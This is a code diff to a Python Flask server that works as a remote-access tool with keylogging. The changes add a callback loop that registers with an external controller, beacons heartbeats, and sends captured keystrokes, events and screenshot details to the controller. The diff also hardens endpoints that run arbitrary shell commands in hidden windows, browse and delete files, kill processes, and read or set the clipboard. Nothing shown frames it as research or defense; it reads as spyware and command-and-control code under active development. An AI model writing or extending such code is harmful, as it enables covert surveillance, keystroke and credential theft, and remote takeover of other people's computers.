@@ -2,7 +2,8 @@ import json
 import os
 import base64
 import secrets
-import uuid  # ADD THIS - Missing import for token operations
+import win32clipboard
+import uuid
 from datetime import datetime, timedelta
 from pathlib import Path
 from threading import Thread, Lock
@@ -71,16 +72,19 @@ config = None
 # ============================================================================
 
 class ReverseConnection:
-    """Handles reverse connection - server pushes data to client"""
+    """Enhanced reverse connection - server auto-registers with client"""
     
     def __init__(self, config):
         self.callback_url = config.get('callback_url')
         self.callback_key = config.get('callback_key')
-        self.interval = config.get('interval', 10)
-        self.retry_interval = config.get('retry_interval', 30)
+        self.interval = config.get('interval', 15)  # Send updates every 15s
+        self.heartbeat_interval = config.get('heartbeat_interval', 5)  # Check connection every 5s
+        self.retry_interval = config.get('retry_interval', 10)  # Retry connection every 10s
         self.enabled = config.get('enabled', False)
         self.running = True
         self.connected = False
+        self.registered = False
+        self.last_heartbeat = None
         
     def start(self):
         """Start the reverse connection thread"""
@@ -88,18 +92,63 @@ class ReverseConnection:
             print("Reverse connection disabled")
             return
         
+        # Start main callback loop
         thread = threading.Thread(target=self._callback_loop, daemon=True)
         thread.start()
-        print(f"Reverse connection enabled - connecting to {self.callback_url}")
+        
+        # Start heartbeat loop
+        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
+        heartbeat_thread.start()
+        
+        print(f" Reverse connection enabled - will connect to {self.callback_url}")
+    
+    def _heartbeat_loop(self):
+        """Send periodic heartbeats to maintain connection"""
+        while self.running:
+            if self.connected:
+                try:
+                    response = requests.post(
+                        f"{self.callback_url}/heartbeat",
+                        json={
+                            "pc_id": pc_id,
+                            "pc_name": config.get('pc_name', 'Unknown'),
+                            "timestamp": datetime.now().isoformat()
+                        },
+                        headers={'X-Callback-Key': self.callback_key},
+                        timeout=3
+                    )
+                    
+                    if response.status_code == 200:
+                        self.last_heartbeat = datetime.now()
+                    else:
+                        # Connection lost
+                        self.connected = False
+                        self.registered = False
+                        print(f" Lost connection to client (heartbeat failed)")
+                        
+                except Exception as e:
+                    self.connected = False
+                    self.registered = False
+                    
+            time.sleep(self.heartbeat_interval)
     
     def _callback_loop(self):
         """Main loop that sends data back to client"""
         while self.running:
             try:
-                # Get current server status
+                # If not connected, try to register
+                if not self.connected:
+                    if self._register_with_client():
+                        self.connected = True
+                        self.registered = True
+                        print(f" Registered with client at {self.callback_url}")
+                    else:
+                        time.sleep(self.retry_interval)
+                        continue
+                
+                # Send data update
                 data = self._collect_data()
                 
-                # Send to your client
                 response = requests.post(
                     f"{self.callback_url}/callback",
                     json=data,
@@ -108,14 +157,11 @@ class ReverseConnection:
                 )
                 
                 if response.status_code == 200:
-                    if not self.connected:
-                        print(f"✓ Connected to client at {self.callback_url}")
-                        self.connected = True
-                    
                     # Check if client sent commands
                     result = response.json()
-                    if result.get('command'):
-                        self._handle_command(result['command'])
+                    if result.get('commands'):
+                        for command in result['commands']:
+                            self._handle_command(command)
                     
                     time.sleep(self.interval)
                 else:
@@ -123,17 +169,57 @@ class ReverseConnection:
                     
             except Exception as e:
                 if self.connected:
-                    print(f"✗ Lost connection to client: {e}")
+                    print(f" Lost connection to client: {e}")
                     self.connected = False
+                    self.registered = False
                 
-                # Retry after delay
                 time.sleep(self.retry_interval)
+    
+    def _register_with_client(self):
+        """Register this server with the client"""
+        try:
+            # Get local IP
+            local_ip = get_local_ip()
+            
+            registration_data = {
+                "type": "register",
+                "pc_id": pc_id,
+                "pc_name": config.get('pc_name', 'Unknown'),
+                "server_url": f"http://{local_ip}:{config['port']}",
+                "api_key": API_KEY,
+                "timestamp": datetime.now().isoformat(),
+                "capabilities": {
+                    "monitoring": True,
+                    "screenshots": True,
+                    "keylogging": True,
+                    "remote_commands": True,
+                    "process_management": WINDOWS_SUPPORT,
+                    "filesystem": True,
+                    "clipboard": WINDOWS_SUPPORT
+                }
+            }
+            
+            response = requests.post(
+                f"{self.callback_url}/register",
+                json=registration_data,
+                headers={'X-Callback-Key': self.callback_key},
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                return True
+            else:
+                print(f"Registration failed: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"Registration error: {e}")
+            return False
     
     def _collect_data(self):
         """Collect data to send to client"""
         global events, keystroke_buffer, monitoring, pc_id, config
         
-        # Create safe reference to config
         current_config = config if config is not None else {}
         
         # Get recent events (last 50)
@@ -144,13 +230,24 @@ class ReverseConnection:
         with keystroke_lock:
             recent_keystrokes = keystroke_buffer[-100:] if len(keystroke_buffer) > 0 else []
         
+        # Get latest screenshot info (not the image data)
+        latest_screenshot = None
+        if screenshot_history:
+            latest_screenshot = {
+                "filename": screenshot_history[-1]['filename'],
+                "timestamp": screenshot_history[-1]['timestamp']
+            }
+        
         return {
+            "type": "update",
             "timestamp": datetime.now().isoformat(),
             "pc_id": pc_id,
             "pc_name": current_config.get('pc_name', 'Unknown'),
             "monitoring": monitoring,
             "event_count": len(events),
             "keystroke_count": len(keystroke_buffer),
+            "screenshot_count": len(screenshot_history),
+            "latest_screenshot": latest_screenshot,
             "events": recent_events,
             "keystrokes": recent_keystrokes
         }
@@ -159,7 +256,7 @@ class ReverseConnection:
         """Handle commands from client"""
         cmd_type = command.get('type')
         
-        print(f"Received command: {cmd_type}")
+        print(f"â†' Received command: {cmd_type}")
         
         if cmd_type == 'start':
             start_monitoring()
@@ -176,7 +273,7 @@ class ReverseConnection:
 
 
 def load_callback_config():
-    """Load callback configuration"""
+    """Load callback configuration with better defaults"""
     callback_file = Path("callback_config.json")
     
     if callback_file.exists():
@@ -186,19 +283,28 @@ def load_callback_config():
         except:
             pass
     
-    # Create default config
+    # Create default config - DISABLED by default, user must configure
     default_config = {
         "enabled": False,
         "callback_url": "http://YOUR_CLIENT_IP:8080",
-        "callback_key": "change_this_secret_key",
-        "interval": 10,
-        "retry_interval": 30
+        "callback_key": "COPY_FROM_CLIENT",
+        "interval": 15,
+        "heartbeat_interval": 5,
+        "retry_interval": 10
     }
     
     with open(callback_file, 'w') as f:
         json.dump(default_config, f, indent=4)
     
-    print(f"\nCreated callback_config.json - Edit it with your client's IP!")
+    print(f"\nâ„¹ï¸  Created callback_config.json")
+    print("   To enable reverse connection:")
+    print("   1. Start the client/manager")
+    print("   2. Copy the callback key from client")
+    print("   3. Edit callback_config.json:")
+    print("      - Set 'enabled': true")
+    print("      - Set 'callback_url' to your client IP")
+    print("      - Set 'callback_key' from client")
+    print("   4. Restart this server")
     
     return default_config
 
@@ -874,21 +980,35 @@ def execute_command():
     try:
         if cmd_type == 'shutdown':
             log_event("remote_command", {"type": "shutdown"})
-            subprocess.Popen(['shutdown', '/s', '/t', '10'])
-            return jsonify({"status": "shutdown initiated"})
+            subprocess.Popen(['shutdown', '/s', '/t', '10'], shell=False)
+            return jsonify({"status": "success", "message": "Shutdown initiated in 10 seconds"})
         
         elif cmd_type == 'restart':
             log_event("remote_command", {"type": "restart"})
-            subprocess.Popen(['shutdown', '/r', '/t', '10'])
-            return jsonify({"status": "restart initiated"})
+            subprocess.Popen(['shutdown', '/r', '/t', '10'], shell=False)
+            return jsonify({"status": "success", "message": "Restart initiated in 10 seconds"})
         
         elif cmd_type == 'launch':
             app_path = data.get('path')
             if not app_path or not isinstance(app_path, str):
                 return jsonify({"error": "Invalid application path"}), 400
+            
             log_event("remote_command", {"type": "launch", "path": app_path})
-            subprocess.Popen(app_path, shell=True)
-            return jsonify({"status": "application launched"})
+            
+            try:
+                # Use Popen with CREATE_NEW_CONSOLE flag for GUI apps
+                process = subprocess.Popen(
+                    app_path,
+                    shell=True,
+                    creationflags=subprocess.CREATE_NEW_CONSOLE if sys.platform == 'win32' else 0
+                )
+                return jsonify({
+                    "status": "success",
+                    "message": f"Application launched",
+                    "pid": process.pid
+                })
+            except Exception as e:
+                return jsonify({"error": f"Failed to launch application: {str(e)}"}), 500
             
         elif cmd_type == 'shell':
             command = data.get('command')
@@ -896,6 +1016,14 @@ def execute_command():
             
             if not command or not isinstance(command, str):
                 return jsonify({"error": "Invalid command"}), 400
+            
+            # Validate timeout
+            try:
+                timeout = int(timeout)
+                if timeout < 1 or timeout > 300:
+                    timeout = 30
+            except:
+                timeout = 30
                 
             log_event("remote_command", {"type": "shell", "command": command})
             
@@ -906,31 +1034,43 @@ def execute_command():
                     shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                    text=True
+                    text=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
                 )
                 
-                stdout, stderr = process.communicate(timeout=timeout)
-                exit_code = process.returncode
-                
-                return jsonify({
-                    "status": "success",
-                    "exit_code": exit_code,
-                    "stdout": stdout,
-                    "stderr": stderr,
-                    "returncode": exit_code  # Added for compatibility
-                })
-                
-            except subprocess.TimeoutExpired:
-                process.kill()
-                return jsonify({"error": f"Command timed out after {timeout} seconds"}), 408
+                try:
+                    stdout, stderr = process.communicate(timeout=timeout)
+                    exit_code = process.returncode
+                    
+                    return jsonify({
+                        "status": "success",
+                        "exit_code": exit_code,
+                        "stdout": stdout,
+                        "stderr": stderr,
+                        "returncode": exit_code
+                    })
+                    
+                except subprocess.TimeoutExpired:
+                    process.kill()
+                    try:
+                        stdout, stderr = process.communicate(timeout=2)
+                    except:
+                        stdout, stderr = "", ""
+                    
+                    return jsonify({
+                        "error": f"Command timed out after {timeout} seconds",
+                        "stdout": stdout,
+                        "stderr": stderr
+                    }), 408
+                    
             except Exception as e:
-                return jsonify({"error": str(e)}), 500
+                return jsonify({"error": f"Command execution failed: {str(e)}"}), 500
         
         else:
-            return jsonify({"error": "Unknown command type"}), 400
+            return jsonify({"error": f"Unknown command type: {cmd_type}"}), 400
     
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify({"error": f"Command failed: {str(e)}"}), 500
 
 @app.route('/api/file', methods=['POST'])
 @require_auth
@@ -1001,36 +1141,65 @@ def filesystem_operations():
     try:
         if request.method == 'GET':
             # List directory contents
-            path = request.args.get('path', '/')
+            path = request.args.get('path', 'C:\\')
+            
+            # Validate path
+            if not path:
+                return jsonify({'success': False, 'error': 'Path parameter required'}), 400
+            
+            # Normalize path
+            path = os.path.normpath(path)
             
             if not os.path.exists(path):
-                return jsonify({'success': False, 'error': 'Path not found'}), 404
+                return jsonify({'success': False, 'error': f'Path not found: {path}'}), 404
                 
             if not os.path.isdir(path):
-                return jsonify({'success': False, 'error': 'Path is not a directory'}), 400
+                return jsonify({'success': False, 'error': f'Path is not a directory: {path}'}), 400
                 
             items = []
-            for item in os.listdir(path):
-                item_path = os.path.join(path, item)
-                try:
-                    stat_info = os.stat(item_path)
-                    item_type = 'directory' if os.path.isdir(item_path) else 'file'
-                    
-                    items.append({
-                        'name': item,
-                        'path': item_path,
-                        'type': item_type,
-                        'size': stat_info.st_size,
-                        'modified': datetime.fromtimestamp(stat_info.st_mtime).isoformat(),
-                        'permissions': stat_info.st_mode
-                    })
-                except Exception:
-                    # Skip items that can't be accessed
-                    continue
+            try:
+                for item in os.listdir(path):
+                    item_path = os.path.join(path, item)
+                    try:
+                        stat_info = os.stat(item_path)
+                        item_type = 'directory' if os.path.isdir(item_path) else 'file'
+                        
+                        # Format size
+                        size = stat_info.st_size if item_type == 'file' else 0
+                        size_str = ""
+                        if size < 1024:
+                            size_str = f"{size} B"
+                        elif size < 1024 * 1024:
+                            size_str = f"{size / 1024:.1f} KB"
+                        elif size < 1024 * 1024 * 1024:
+                            size_str = f"{size / (1024 * 1024):.1f} MB"
+                        else:
+                            size_str = f"{size / (1024 * 1024 * 1024):.2f} GB"
+                        
+                        items.append({
+                            'name': item,
+                            'path': item_path,
+                            'type': item_type,
+                            'size': size_str,
+                            'size_bytes': size,
+                            'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
+                        })
+                    except (OSError, PermissionError):
+                        # Skip items that can't be accessed
+                        continue
+                
+                # Sort: directories first, then files, alphabetically
+                items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
+                
+            except PermissionError:
+                return jsonify({'success': False, 'error': f'Permission denied accessing: {path}'}), 403
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to list directory: {str(e)}'}), 500
                     
             return jsonify({
                 'success': True,
                 'path': path,
+                'parent': os.path.dirname(path) if path != os.path.dirname(path) else None,
                 'items': items
             }), 200
             
@@ -1044,17 +1213,22 @@ def filesystem_operations():
             if not path or not isinstance(path, str):
                 return jsonify({'success': False, 'error': 'Valid path required'}), 400
             
+            # Normalize path
+            path = os.path.normpath(path)
+            
             if operation == 'mkdir':
                 try:
                     os.makedirs(path, exist_ok=True)
                     log_event("filesystem", {"type": "mkdir", "path": path})
                     return jsonify({'success': True, 'message': f'Directory created: {path}'}), 200
+                except PermissionError:
+                    return jsonify({'success': False, 'error': f'Permission denied: {path}'}), 403
                 except Exception as e:
                     return jsonify({'success': False, 'error': f'Failed to create directory: {str(e)}'}), 500
                     
             elif operation == 'delete':
                 if not os.path.exists(path):
-                    return jsonify({'success': False, 'error': 'Path not found'}), 404
+                    return jsonify({'success': False, 'error': f'Path not found: {path}'}), 404
                     
                 try:
                     if os.path.isdir(path):
@@ -1064,13 +1238,14 @@ def filesystem_operations():
                         os.remove(path)
                     log_event("filesystem", {"type": "delete", "path": path})
                     return jsonify({'success': True, 'message': f'Deleted: {path}'}), 200
+                except PermissionError:
+                    return jsonify({'success': False, 'error': f'Permission denied: {path}'}), 403
                 except Exception as e:
                     return jsonify({'success': False, 'error': f'Failed to delete: {str(e)}'}), 500
                     
             else:
-                return jsonify({'success': False, 'error': 'Invalid operation'}), 400
+                return jsonify({'success': False, 'error': f'Invalid operation: {operation}'}), 400
         
-        # Handle any other HTTP method
         return jsonify({'success': False, 'error': 'Method not allowed'}), 405
                 
     except Exception as e:
@@ -1085,45 +1260,38 @@ def process_management():
             # List running processes
             processes = []
             
-            if WINDOWS_SUPPORT:
-                import psutil
+            if not WINDOWS_SUPPORT:
+                return jsonify({'success': False, 'error': 'Process management requires Windows support (psutil)'}), 400
+            
+            try:
                 for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                     try:
                         proc_info = proc.info
                         processes.append({
                             'pid': proc_info['pid'],
-                            'name': proc_info['name'],
-                            'username': proc_info['username'],
-                            'memory_mb': round(proc_info['memory_info'].rss / (1024 * 1024), 2),
-                            'cpu_percent': proc_info['cpu_percent']
+                            'name': proc_info['name'] or 'Unknown',
+                            'username': proc_info['username'] or 'System',
+                            'memory_mb': round(proc_info['memory_info'].rss / (1024 * 1024), 2) if proc_info['memory_info'] else 0,
+                            'cpu_percent': proc_info['cpu_percent'] or 0.0
                         })
                     except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                         pass
-            else:
-                # Fallback for non-Windows systems
-                import subprocess
-                output = subprocess.check_output(['ps', 'aux']).decode('utf-8')
-                lines = output.strip().split('\n')
-                for line in lines[1:]:  # Skip header
-                    parts = line.split(None, 10)
-                    if len(parts) >= 10:
-                        processes.append({
-                            'username': parts[0],
-                            'pid': int(parts[1]),
-                            'cpu_percent': float(parts[2]),
-                            'memory_mb': float(parts[5]),
-                            'name': parts[10] if len(parts) > 10 else parts[9]
-                        })
-            
-            return jsonify({
-                'success': True,
-                'processes': processes
-            }), 200
+                
+                return jsonify({
+                    'success': True,
+                    'processes': sorted(processes, key=lambda x: x['memory_mb'], reverse=True)
+                }), 200
+                
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to list processes: {str(e)}'}), 500
             
         elif request.method == 'POST':
             # Process operations (kill, start)
             data = request.get_json() or {}
             operation = data.get('operation')
+            
+            if not WINDOWS_SUPPORT:
+                return jsonify({'success': False, 'error': 'Process management requires Windows support (psutil)'}), 400
             
             if operation == 'kill':
                 pid = data.get('pid')
@@ -1131,50 +1299,46 @@ def process_management():
                     return jsonify({'success': False, 'error': 'PID required'}), 400
                 
                 try:
-                    import psutil
+                    pid = int(pid)
                     process = psutil.Process(pid)
+                    process_name = process.name()
                     process.terminate()
-                    log_event("process", {"type": "kill", "pid": pid})
-                    return jsonify({'success': True, 'message': f'Process {pid} terminated'}), 200
+                    
+                    # Wait for termination
+                    try:
+                        process.wait(timeout=3)
+                    except psutil.TimeoutExpired:
+                        # Force kill if terminate didn't work
+                        process.kill()
+                    
+                    log_event("process", {"type": "kill", "pid": pid, "name": process_name})
+                    return jsonify({'success': True, 'message': f'Process {pid} ({process_name}) terminated'}), 200
+                    
                 except psutil.NoSuchProcess:
                     return jsonify({'success': False, 'error': f'Process {pid} not found'}), 404
                 except psutil.AccessDenied:
-                    return jsonify({'success': False, 'error': f'Access denied to process {pid}'}), 403
+                    return jsonify({'success': False, 'error': f'Access denied to process {pid}. Try running server as Administrator'}), 403
+                except ValueError:
+                    return jsonify({'success': False, 'error': 'Invalid PID - must be a number'}), 400
                 except Exception as e:
-                    return jsonify({'success': False, 'error': str(e)}), 500
+                    return jsonify({'success': False, 'error': f'Failed to kill process: {str(e)}'}), 500
             
             elif operation == 'start':
                 command = data.get('command')
-                if not command:
+                if not command or not isinstance(command, str):
                     return jsonify({'success': False, 'error': 'Command required'}), 400
                 
                 try:
-                    import subprocess
                     process = subprocess.Popen(
                         command,
                         shell=True,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
-                        text=True
+                        text=True,
+                        creationflags=subprocess.CREATE_NEW_CONSOLE if sys.platform == 'win32' else 0
                     )
                     
-                    # Wait a short time to see if process starts successfully
-                    try:
-                        return_code = process.wait(timeout=1)
-                        stdout, stderr = process.communicate()
-                        
-                        if return_code != 0:
-                            return jsonify({
-                                'success': False,
-                                'error': f'Process exited with code {return_code}',
-                                'stdout': stdout,
-                                'stderr': stderr
-                            }), 500
-                    except subprocess.TimeoutExpired:
-                        # Process is still running, which is good
-                        pass
-                    
-                    log_event("process", {"type": "start", "command": command})
+                    log_event("process", {"type": "start", "command": command, "pid": process.pid})
                     return jsonify({
                         'success': True,
                         'message': f'Process started',
@@ -1182,12 +1346,11 @@ def process_management():
                     }), 200
                     
                 except Exception as e:
-                    return jsonify({'success': False, 'error': str(e)}), 500
+                    return jsonify({'success': False, 'error': f'Failed to start process: {str(e)}'}), 500
             
             else:
-                return jsonify({'success': False, 'error': 'Invalid operation'}), 400
-    
-        # Add this before the final "except Exception as e:" in each route
+                return jsonify({'success': False, 'error': f'Invalid operation: {operation}'}), 400
+        
         return jsonify({'success': False, 'error': 'Method not allowed'}), 405
 
     except Exception as e:
@@ -1205,13 +1368,28 @@ def clipboard_operations():
         if request.method == 'GET':
             # Get clipboard content
             try:
-                import pyperclip
-                content = pyperclip.paste()
+                import win32clipboard
+                
+                win32clipboard.OpenClipboard()
+                try:
+                    # Try to get text from clipboard
+                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                        content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+                    elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
+                        content = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
+                        if isinstance(content, bytes):
+                            content = content.decode('utf-8', errors='ignore')
+                    else:
+                        content = ""
+                finally:
+                    win32clipboard.CloseClipboard()
+                
                 return jsonify({
                     'success': True,
                     'content': content,
                     'timestamp': datetime.now().isoformat()
                 }), 200
+                
             except Exception as e:
                 return jsonify({'success': False, 'error': f'Failed to get clipboard: {str(e)}'}), 500
                 
@@ -1224,17 +1402,24 @@ def clipboard_operations():
                 return jsonify({'success': False, 'error': 'Content required'}), 400
                 
             try:
-                import pyperclip
-                pyperclip.copy(content)
-                log_event("clipboard", {"type": "set", "length": len(content)})
+                import win32clipboard
+                
+                win32clipboard.OpenClipboard()
+                try:
+                    win32clipboard.EmptyClipboard()
+                    win32clipboard.SetClipboardText(str(content), win32clipboard.CF_UNICODETEXT)
+                finally:
+                    win32clipboard.CloseClipboard()
+                
+                log_event("clipboard", {"type": "set", "length": len(str(content))})
                 return jsonify({
                     'success': True,
                     'message': 'Clipboard content set'
                 }), 200
+                
             except Exception as e:
                 return jsonify({'success': False, 'error': f'Failed to set clipboard: {str(e)}'}), 500
-                
-        # Add this before the final "except Exception as e:" in each route
+        
         return jsonify({'success': False, 'error': 'Method not allowed'}), 405
     
     except Exception as e:
